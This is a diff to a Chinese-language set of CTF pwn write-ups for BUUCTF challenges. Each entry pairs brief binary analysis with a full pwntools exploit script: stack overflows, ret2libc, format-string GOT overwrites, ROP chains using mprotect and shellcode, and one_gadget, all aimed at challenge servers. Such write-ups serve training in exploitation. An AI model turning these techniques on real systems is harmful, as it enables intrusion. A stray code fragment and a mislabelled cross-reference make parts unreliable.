@@ -261,7 +261,7 @@ io.sendlineafter("to be encrypted\n",payload)
 
 io.recvuntil("Ciphertext\n")
 io.recvline()
-puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))
+puts_addr = u64(io.recv(6).ljust(8, '\x00'))
 
 success("puts_addr   " + hex(puts_addr))
 
@@ -295,9 +295,15 @@ io.sendline('cat flag')
 io.recvline()
 
 
-# io.sendline(payload)
-io.close()
+io.sendline(payload)
 ```
+
+### ctjx
+
+1. recv 一定要设置正确！这道题recvline() , recv(8) 都不行
+2. libc 版本一定要正确，要么用给的，要么就用libcseacher
+3. "timeout: the monitored command dumped core" ：由于对齐原因，需要平衡栈，使用ret命令（1-15）次
+
 ## 0x06 [OGeek2019]babyrop
 ### ans ret2libc
 
@@ -372,3 +378,391 @@ io.sendlineafter("Correct",payload)
 
 io.interactive()
 ```
+
+## 0x07 ciscn_2019_en_2
+### ans  ret2libc
+雷同题： 0x05 ciscn_2019_c_1
+### exp
+```略```
+
+
+## 0x08 jarvisoj_level0
+### ans  ret2text
+read() 长度过大造成的简单栈溢出
+### exp
+```python
+from pwn import *
+context.log_level = "debug"
+
+# io = process('./jarvisoj_level0')
+io = remote('node3.buuoj.cn','29100')
+
+shell = 0x40059A
+
+payload = 0x88 * 'a' + p64(shell)
+
+io.sendlineafter("Hello, World\n",payload)
+
+io.interactive()
+```
+
+
+
+
+
+## 0x09 [第五空间2019 决赛]PWN5
+### ans  格式化字符串
+```c++
+ v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &unk_804C044, 4u);
+  printf("your name:");
+  read(0, &buf, 0x63u);
+  printf("Hello,");
+  printf(&buf);
+  printf("your passwd:");
+  read(0, &nptr, 0xFu);
+  if ( atoi(&nptr) == unk_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+```
+格式化字符串：  
+使用爆破的方法测出格式化字符串参数的偏移。  
+- 法一：   修改验证的字符串，使得输入的 nptr ==  unk_804C044  
+- 法二：  修改 atoi() 为 system() 的地址，传入 “/bin/sh”。
+ 
+想要泄露 unk_804C044 中的值理论上也可行，但是个人觉得比较勉强，毕竟不知道 0x804C044 在栈上的哪个位置。
+
+### exp
+
+
+```python
+from pwn import *
+context.log_level = "debug"
+
+global offset
+
+for i in range(2,20):
+	r = process('./dwkj_pwn5')
+	payload = "a%{0}$x".format(i)
+	r.sendlineafter("name",payload)
+	r.recvuntil("Hello,")
+	data = r.recv(10)
+	success(data)
+	if '61' in data:
+		offset = i
+		break 
+	r.close()
+
+
+offset = 10
+success("offset:" + str(offset))
+
+# io = process('./dwkj_pwn5')
+io = remote('node3.buuoj.cn','29220')
+
+# # exp1
+# check_addr = 0x804C044
+# payload = fmtstr_payload(offset, {check_addr: 0x1})
+# io.sendlineafter("name:",payload)
+# io.sendlineafter("passwd:","1")
+
+# exp2
+e = ELF('./dwkj_pwn5')
+atio_got = e.got['atoi']
+system_plt = e.plt['system']
+payload = fmtstr_payload(offset, {atio_got:system_plt})
+io.sendlineafter("name:",payload)
+io.sendlineafter("passwd:","/bin/sh\x00")
+
+io.interactive()
+```
+
+
+from pwn import *
+
+io = remote('node3.buuoj.cn', 27545)
+
+
+
+
+
+
+
+
+
+## 0x0a get_started_3dsctf_2016
+### ans  orw
+
+orw：  
+使用 open , read , write 三个函数对 flag 进行读写。  
+找到 pop_3_ret 和 pop_2_ret，写到 ret 地址上，使得执行流能够再次回到布局好的栈上。
+
+mprotect + shellcode:  
+利用mprotect函数修改bss段的权限，让其有执行权限。  
+再用read写入shellcode，然后跳转到bss段执行来getshell。
+
+### exp  
+```python
+
+from pwn import *
+
+io = remote('node3.buuoj.cn', 27545)
+# io = process("./get_started_3dsctf_2016")
+e = ELF("./get_started_3dsctf_2016")
+
+pop_3_ret  = 0x809e4c5
+pop_2_ret  = 0x806fc31
+bss_addr   = 0x80EC000 
+flag_addr  = 0x80BC388
+open_addr  = e.symbols['open']
+read_addr  = e.symbols['read']
+write_addr = e.symbols['write'] 
+mprotect_addr = e.symbols['mprotect']
+mpr_len    = 0x1000
+mpr_prot   = 7  # rxw=7
+main_addr  = e.symbols['main']
+
+# # orw
+payload =  'a' * 0x38 + p32(open_addr) + p32(pop_2_ret) + p32(flag_addr) + p32(0) # pop2 跳过两个参数
+payload += p32(read_addr) + p32(pop_3_ret) + p32(3) + p32(bss_addr) + p32(64) # pop3 跳过三个参数
+payload += p32(write_addr) + 'dead' + p32(1) + p32(bss_addr) + p32(64)
+io.sendline(payload)
+io.interactive()
+
+# # mprotect + shellcode
+# shellcode = asm(shellcraft.sh())
+# payload = 'a' *0x38 + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(mpr_len) + p32(mpr_prot)
+# payload += p32(read_addr) + p32(pop_3_ret) + p32(0) + p32(bss_addr) + p32(len(shellcode))
+# payload += p32(bss_addr)
+# io.sendline(payload)
+# io.sendline(shellcode)
+# io.interactive()
+
+```
+
+## 0x0b [BJDCTF 2nd]r2t3
+### ans 
+```c++
+  char buf; // [esp+0h] [ebp-408h]
+
+  my_init();
+  puts("**********************************");
+  puts("*     Welcome to the BJDCTF!     *");
+  puts("[+]Ret2text3.0?");
+  puts("[+]Please input your name:");
+  read(0, &buf, 0x400u);
+  name_check(&buf);
+  puts("Welcome ,u win!");
+  return 0;
+```
+没有溢出。。到name_check里面看看。
+
+```c++
+  char dest; // [esp+7h] [ebp-11h]
+  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
+
+  v3 = strlen(s);
+  if ( v3 <= 3u || v3 > 8u )
+  {
+    puts("Oops,u name is too long!");
+    exit(-1);
+  }
+  printf("Hello,My dear %s", s);
+  return strcpy(&dest, s);
+```
+必须绕过验证，unsigned int 有溢出的机会。
+
+```c++
+.text:080485E1                 call    _strlen
+.text:080485E6                 add     esp, 10h
+.text:080485E9                 mov     [ebp+var_9], al
+.text:080485EC                 cmp     [ebp+var_9], 3
+.text:080485F0                 jbe     short loc_804861F
+.text:080485F2                 cmp     [ebp+var_9], 8
+.text:080485F6                 ja      short loc_804861F
+.text:080485F8                 sub     esp, 8
+.text:080485FB                 push    [ebp+s]
+.text:080485FE                 push    offset format   ; "Hello,My dear %s"
+.text:08048603                 call    _printf
+```
+看到 080485E9 处使用 al 寄存器，可以进行4位的溢出。  
+输入范围是 ( 3+256*i , 8+256*i ]   
+我们选择 ( 0x103 , 0x108 ]
+
+### exp 
+```python
+from pwn import *
+context.log_level = "debug"
+io = process('./r2t3')
+io = remote('node3.buuoj.cn',25630)
+
+payload = 'a'*0x15 + p32(0x0804858B) 
+payload = payload.ljust(0x105,'b') 
+io.recvuntil("[+]Please input your name:")
+io.send(payload)
+io.interactive()
+
+```
+
+
+## 0x0c ciscn_2019_n_8
+### ans 
+
+```c++
+puts("What's your name?");
+  __isoc99_scanf("%s", var, v4, v5);
+  if ( *(_QWORD *)&var[13] )
+  {
+    if ( *(_QWORD *)&var[13] == 0x11LL )
+      system("/bin/sh");
+    else
+      printf(
+        "something wrong! val is %d",var[0],var[1],var[2],var[3],var[4], var[5], var[6], var[7], var[8],var[9], var[10], var[11],var[12],var[13],var[14]);
+  }
+  else
+  {
+    printf("%s, Welcome!\n", var);
+    puts("Try do something~");
+  }
+```
+
+输入的var是数组，var[13] == 0x11 时可以getshell
+
+### exp
+```python
+from pwn import *
+context.log_level = "debug"
+# io = process('./ciscn_2019_n_8')
+io = remote('node3.buuoj.cn','27094')
+io.recvuntil("name?\n")
+# payload = '\x11' * 53  #当时想自己手动二分法试试什么时候不报错，结果成功了
+payload = p32(0x11) * 14
+io.sendline(payload)
+io.interactive()
+```
+
+
+## 0x0d not_the_same_3dsctf_2016
+### ans orw 
+同 0x10 get_started_3dsctf_2016  
+
+ida中padding的长度错误，使用gdb + cyclic确定
+
+### exp
+```python
+from pwn import *
+
+# io = remote('node3.buuoj.cn', 27545)
+io = process("./not_the_same_3dsctf_2016")
+e = ELF("./not_the_same_3dsctf_2016")
+
+pop_3_ret  = 0x0809e3e5
+pop_2_ret  = 0x080483b9
+bss_addr   = 0x80EC000 
+flag_addr  = 0x80bc2a8
+open_addr  = e.symbols['open']
+read_addr  = e.symbols['read']
+write_addr = e.symbols['write'] 
+mprotect_addr = e.symbols['mprotect']
+mpr_len    = 0x1000
+mpr_prot   = 7  # rxw=7
+main_addr  = e.symbols['main']
+
+# # orw
+# payload =  'a' * 0x2D + p32(open_addr) + p32(pop_2_ret) + p32(flag_addr) + p32(0)
+# payload += p32(read_addr) + p32(pop_3_ret) + p32(3) + p32(bss_addr) + p32(64)
+# payload += p32(write_addr) + 'dead' + p32(1) + p32(bss_addr) + p32(64)
+# io.sendline(payload)
+# io.interactive()
+
+# # mprotect
+shellcode = asm(shellcraft.sh())
+payload = 'a' * 0x2D + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(mpr_len) + p32(mpr_prot)
+payload += p32(read_addr) + p32(pop_3_ret) + p32(0) + p32(bss_addr) + p32(len(shellcode))
+payload += p32(bss_addr)
+io.sendline(payload)
+io.sendline(shellcode)
+io.interactive()
+```
+
+## 0x0e [BJDCTF 2nd]one_gadget
+### ans one_gadget
+输出printf的地址  
+确定libc基址  
+计算one_gadget地址（一共四个，总有能成功的）
+
+### exp
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+context.log_level = "debug"
+# io = process('./bjd_one_gadget')
+io = remote('node3.buuoj.cn','29412')
+
+io.recvuntil("here is the gift for u:")
+printf_addr = int(io.recvline(),16)
+success("printf_addr   " + hex(printf_addr))
+
+# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("libc-2.29-64.so")
+libc_base = printf_addr - libc.sym["printf"]
+
+# one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget = [0xe237f,0xe2383,0xe2386, 0x106ef8]
+one_gadget_addr = libc_base + one_gadget[3]
+
+io.recvuntil("Give me your one gadget:")
+io.sendline(str(one_gadget_addr))
+
+io.interactive()
+```
+
+## 0x0f [HarekazeCTF2019]baby_rop
+### ans ret2text
+简单 ret2text 栈溢出
+### exp
+```python
+from pwn import *
+context.log_level = "debug"
+
+# io = process('./hk_babyrop')
+io = remote('node3.buuoj.cn','28332')
+e = ELF('./hk_babyrop')
+
+binsh_addr = 0x601048
+system_addr = e.symbols['system']
+pop_rdi = 0x0400683
+
+io.recvuntil('your name?')
+payload = 0x18 * 'a' + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+## 0x10 jarvisoj_level2
+### ans ret2text
+简单 ret2text 栈溢出
+### exp
+```python
+from pwn import *
+context.log_level = "debug"
+
+# io = process('./jarvisoj_level2')
+io = remote('node3.buuoj.cn','26699')
+e = ELF('./jarvisoj_level2')
+
+binsh_addr = 0x0804a029
+system_addr = e.symbols['system']
+
+io.recvuntil('Input:')
+payload = (0x88 + 4) * 'a'  + p32(system_addr)  + 'dead'+ p32(binsh_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+## 0x11 babyheap_0ctf_2017
+### ans fastbin double free
